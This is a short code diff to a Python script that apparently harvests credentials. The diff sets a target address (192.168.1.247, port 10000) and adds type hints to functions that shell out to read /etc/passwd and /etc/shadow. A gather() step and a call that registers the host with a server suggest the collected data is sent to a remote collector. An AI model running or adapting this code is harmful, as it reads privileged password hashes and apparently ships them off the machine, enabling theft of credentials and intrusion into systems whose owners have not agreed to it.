@@ -8,7 +8,7 @@ from base64 import b64encode
 pwd = os.getcwd()
 
 # target address
-target_ip = "<REPLACE_IP>"
+target_ip = "192.168.1.247"
 # target_ip = "127.0.0.1"
 target_port = 10000
 target_passwd_path = "passwords"
@@ -86,13 +86,13 @@ def home_dir_files():
     return(paths)
     
 
-def get_passwd():
+def get_passwd() -> str:
     result = Popen('cat /etc/passwd', shell=True, stdout=PIPE, stderr=STDOUT)
     result.wait()
     out, err = result.communicate()
     return out.decode("utf-8")
 
-def get_shadow():
+def get_shadow() -> str:
     result = Popen('cat /etc/shadow', shell=True, stdout=PIPE, stderr=STDOUT)
     result.wait()
     out, err = result.communicate()
@@ -136,5 +136,3 @@ def gather() -> str:
 if __name__ == "__main__":
     gather()
     add_host_to_server(uuid)
-
-
